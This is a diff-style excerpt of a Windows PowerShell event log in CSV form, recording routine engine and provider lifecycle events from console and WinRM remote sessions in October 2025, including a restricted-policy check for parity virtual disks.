+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=b456a441-e3bc-4f33-b259-81a35a1bd49f
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:37:32 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=b456a441-e3bc-4f33-b259-81a35a1bd49f
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:37:32 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=b456a441-e3bc-4f33-b259-81a35a1bd49f
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:37:32 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=b456a441-e3bc-4f33-b259-81a35a1bd49f
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:37:32 AM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=b456a441-e3bc-4f33-b259-81a35a1bd49f
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:37:32 AM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=b456a441-e3bc-4f33-b259-81a35a1bd49f
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $VDisks = (Get-VirtualDisk | Where-Object ResiliencySettingName -eq Parity); if ($null -ne $VDisks) { $Res = 1 }; Write-Host 'Final result:',$Res;
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:37:32 AM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=29
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e76cc26b-c315-4323-ad73-9e98a4230269
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.17763.2931
+	RunspaceId=4e5a4c72-d36e-49f3-93ca-ee328d5b99bd
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:37:31 AM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e76cc26b-c315-4323-ad73-9e98a4230269
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=5.1.17763.2931
+	RunspaceId=4e5a4c72-d36e-49f3-93ca-ee328d5b99bd
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:37:31 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e76cc26b-c315-4323-ad73-9e98a4230269
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:37:31 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e76cc26b-c315-4323-ad73-9e98a4230269
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:37:31 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e76cc26b-c315-4323-ad73-9e98a4230269
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:37:31 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e76cc26b-c315-4323-ad73-9e98a4230269
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:37:31 AM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e76cc26b-c315-4323-ad73-9e98a4230269
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:37:31 AM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=e76cc26b-c315-4323-ad73-9e98a4230269
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:17:49 AM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f792f5fb-c7e5-4941-bf7c-c8e8713cf7db
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.17763.2931
+	RunspaceId=2173b14a-f947-489a-9fe7-4da65faeb194
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:17:49 AM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f792f5fb-c7e5-4941-bf7c-c8e8713cf7db
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:17:49 AM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f792f5fb-c7e5-4941-bf7c-c8e8713cf7db
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:17:49 AM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f792f5fb-c7e5-4941-bf7c-c8e8713cf7db
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:17:49 AM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f792f5fb-c7e5-4941-bf7c-c8e8713cf7db
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:17:49 AM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f792f5fb-c7e5-4941-bf7c-c8e8713cf7db
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/28/2025 1:17:49 AM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=5.1.17763.2931
+	HostId=f792f5fb-c7e5-4941-bf7c-c8e8713cf7db
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:48:35 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=59
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.17763.2931
+	RunspaceId=cdf14365-a2b6-4d88-ad29-f331b69c6e34
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:20:21 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=57
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.17763.2931
+	RunspaceId=ee7b61d0-8d79-4ac7-9012-37bcd0fe817c
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:19:21 PM,PowerShell,403,Engine Lifecycle,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=55
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.17763.2931
+	RunspaceId=d0e64517-d827-4645-8749-58c5e1589d13
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=53
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.17763.2931
+	RunspaceId=ee7b61d0-8d79-4ac7-9012-37bcd0fe817c
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""WSMan"" is Started. 
+
+Details: 
+	ProviderName=WSMan
+	NewProviderState=Started
+
+	SequenceNumber=51
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Certificate"" is Started. 
+
+Details: 
+	ProviderName=Certificate
+	NewProviderState=Started
+
+	SequenceNumber=49
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=47
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=45
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=43
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=41
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=39
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=37
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=22af33f8-f97d-4ee4-9f7b-d7eb55c3db33
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=35
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.17763.2931
+	RunspaceId=d0e64517-d827-4645-8749-58c5e1589d13
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""WSMan"" is Started. 
+
+Details: 
+	ProviderName=WSMan
+	NewProviderState=Started
+
+	SequenceNumber=33
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Certificate"" is Started. 
+
+Details: 
+	ProviderName=Certificate
+	NewProviderState=Started
+
+	SequenceNumber=31
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=29
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=27
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=25
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=23
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=21
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:21 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=19
+
+	HostName=Default Host
+	HostVersion=5.1.17763.2931
+	HostId=35239362-dbdb-40cb-a409-3fc99e6d2ee6
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:10 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.17763.2931
+	RunspaceId=cdf14365-a2b6-4d88-ad29-f331b69c6e34
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:10 PM,PowerShell,600,Provider Lifecycle,"Provider ""WSMan"" is Started. 
+
+Details: 
+	ProviderName=WSMan
+	NewProviderState=Started
+
+	SequenceNumber=15
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:10 PM,PowerShell,600,Provider Lifecycle,"Provider ""Certificate"" is Started. 
+
+Details: 
+	ProviderName=Certificate
+	NewProviderState=Started
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:10 PM,PowerShell,600,Provider Lifecycle,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:10 PM,PowerShell,600,Provider Lifecycle,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:10 PM,PowerShell,600,Provider Lifecycle,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:10 PM,PowerShell,600,Provider Lifecycle,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:10 PM,PowerShell,600,Provider Lifecycle,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:10 PM,PowerShell,600,Provider Lifecycle,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=7c9689ac-d3ae-43a6-8d6f-aa463b5230f3
+	HostApplication=C:\Windows\system32\wsmprovhost.exe -Embedding
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+Information,10/24/2025 7:17:07 PM,PowerShell,400,Engine Lifecycle,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
